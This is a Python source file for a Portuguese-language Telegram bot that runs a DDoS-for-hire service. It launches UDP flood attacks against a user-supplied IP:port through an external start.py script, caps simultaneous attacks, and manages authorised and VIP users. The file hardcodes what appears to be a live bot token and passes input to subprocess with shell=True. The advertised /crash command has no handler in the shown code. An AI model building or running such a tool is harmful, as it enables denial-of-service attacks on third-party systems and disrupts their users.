import telebot
import subprocess
import re
import time
from threading import Thread

BOT_TOKEN = "7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8"
SEU_ID_TELEGRAM = 6430703027
bot = telebot.TeleBot(BOT_TOKEN)

# Configurações e listas
processos = {}
authorized_users = [SEU_ID_TELEGRAM]  # Lista de usuários autorizados
vip_users = []  # Lista de usuários VIP
vip_commands = []  # Comandos restritos a VIPs
MAX_ATTACKS = 3  # Limite de ataques simultâneos

# Função para validar o formato de IP e Porta
def validar_ip_porta(ip_porta):
    padrao = r'^\d{1,3}(\.\d{1,3}){3}:\d+$'
    return re.match(padrao, ip_porta) is not None

# Função para executar o comando do ataque
def executar_comando(ip_porta, threads, tempo):
    comando_terminal = f"python3 start.py UDP {ip_porta} {threads} {tempo}"
    try:
        processo = subprocess.Popen(
            comando_terminal, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE
        )
        processos[ip_porta] = processo
        time.sleep(int(tempo))  # Aguarda o tempo do ataque
        processo.terminate()  # Termina o processo após o tempo especificado
        del processos[ip_porta]  # Remove o processo da lista
    except Exception as e:
        print(f"Erro ao executar o comando: {str(e)}")

# Função para gerenciar o limite de ataques simultâneos
def manage_attacks():
    if len(processos) >= MAX_ATTACKS:
        oldest_process = list(processos.values())[0]  # Pega o primeiro processo
        oldest_process.terminate()  # Termina o processo mais antigo
        del processos[list(processos.keys())[0]]  # Remove da lista de processos

# Comando /start
@bot.message_handler(commands=['start'])
def start_message(message):
    welcome_text = (
        "Bem-vindo ao bot! 🚀\n\n"
        "Aqui estão os comandos disponíveis para você:\n\n"
        "Comandos básicos:\n"
        "/crash <IP:PORTA> <threads> <tempo> - Envia um ataque ao IP especificado.\n"
        "/meuid - Mostra seu ID de usuário.\n\n"
        "Comandos para usuários autorizados e VIPs:\n"
        "/adduser <ID> - Adiciona um usuário autorizado.\n"
        "/removeuser <ID> - Remove um usuário autorizado.\n"
        "/promovervip <ID> - Promove um usuário a VIP. (Somente o dono pode)\n"
        "/rebaixarvip <ID> - Remove o status de VIP de um usuário. (Somente o dono pode)\n\n"
        "Comandos exclusivos do dono do bot:\n"
        "/addcomandovip <comando> - Restringe um comando para VIPs.\n"
        "/revcomandovip <comando> - Remove a restrição de comando VIP.\n\n"
        "Entre em contato se precisar de ajuda! 😉"
    )
    bot.send_message(message.chat.id, welcome_text)

# Comando /meuid
@bot.message_handler(commands=['meuid'])
def send_user_id(message):
    bot.send_message(message.chat.id, f"Seu ID de usuário é: {message.from_user.id}")

# Comando /adduser
@bot.message_handler(commands=['adduser'])
def add_user(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, "Apenas o dono pode adicionar usuários.")
        return
    try:
        user_id = int(message.text.split()[1])
        if user_id not in authorized_users:
            authorized_users.append(user_id)
            bot.send_message(message.chat.id, f"Usuário {user_id} adicionado com sucesso!")
        else:
            bot.send_message(message.chat.id, f"O usuário {user_id} já está autorizado.")
    except:
        bot.send_message(message.chat.id, "Uso correto: /adduser <ID>")

# Comando /removeuser
@bot.message_handler(commands=['removeuser'])
def remove_user(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, "Apenas o dono pode remover usuários.")
        return
    try:
        user_id = int(message.text.split()[1])
        if user_id in authorized_users:
            authorized_users.remove(user_id)
            bot.send_message(message.chat.id, f"Usuário {user_id} removido com sucesso!")
        else:
            bot.send_message(message.chat.id, f"O usuário {user_id} não está na lista de autorizados.")
    except:
        bot.send_message(message.chat.id, "Uso correto: /removeuser <ID>")

# Comando /promovervip
@bot.message_handler(commands=['promovervip'])
def promover_vip(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, "Apenas o dono pode promover usuários a VIP.")
        return
    try:
        user_id = int(message.text.split()[1])
        if user_id not in vip_users:
            vip_users.append(user_id)
            bot.send_message(message.chat.id, f"Usuário {user_id} promovido a VIP!")
        else:
            bot.send_message(message.chat.id, f"O usuário {user_id} já é VIP.")
    except:
        bot.send_message(message.chat.id, "Uso correto: /promovervip <ID>")

# Comando /rebaixarvip
@bot.message_handler(commands=['rebaixarvip'])
def rebaixar_vip(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, "Apenas o dono pode rebaixar usuários VIP.")
        return
    try:
        user_id = int(message.text.split()[1])
        if user_id in vip_users:
            vip_users.remove(user_id)
            bot.send_message(message.chat.id, f"Usuário {user_id} rebaixado de VIP com sucesso!")
        else:
            bot.send_message(message.chat.id, f"O usuário {user_id} não é VIP.")
    except:
        bot.send_message(message.chat.id, "Uso correto: /rebaixarvip <ID>")

# Comando /addcomandovip
@bot.message_handler(commands=['addcomandovip'])
def add_command_vip(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, "Apenas o dono pode adicionar comandos VIP.")
        return
    try:
        comando = message.text.split()[1].lower()
        if comando not in vip_commands:
            vip_commands.append(comando)
            bot.send_message(message.chat.id, f"O comando '{comando}' foi adicionado à lista de comandos VIP.")
        else:
            bot.send_message(message.chat.id, f"O comando '{comando}' já é VIP.")
    except:
        bot.send_message(message.chat.id, "Uso correto: /addcomandovip <comando>")

# Comando /revcomandovip
@bot.message_handler(commands=['revcomandovip'])
def remove_command_vip(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, "Apenas o dono pode remover comandos VIP.")
        return
    try:
        comando = message.text.split()[1].lower()
        if comando in vip_commands:
            vip_commands.remove(comando)
            bot.send_message(message.chat.id, f"O comando '{comando}' foi removido da lista de comandos VIP.")
        else:
            bot.send_message(message.chat.id, f"O comando '{comando}' não é VIP.")
    except:
        bot.send_message(message.chat.id, "Uso correto: /revcomandovip <comando>")

# Função para manter o bot ativo
def keep_alive():
    while True:
        try:
            bot.polling(timeout=60)
        except Exception as e:
            print(f"Erro no bot: {e}")
            time.sleep(15)

# Iniciar o bot
if __name__ == "__main__":
    keep_alive()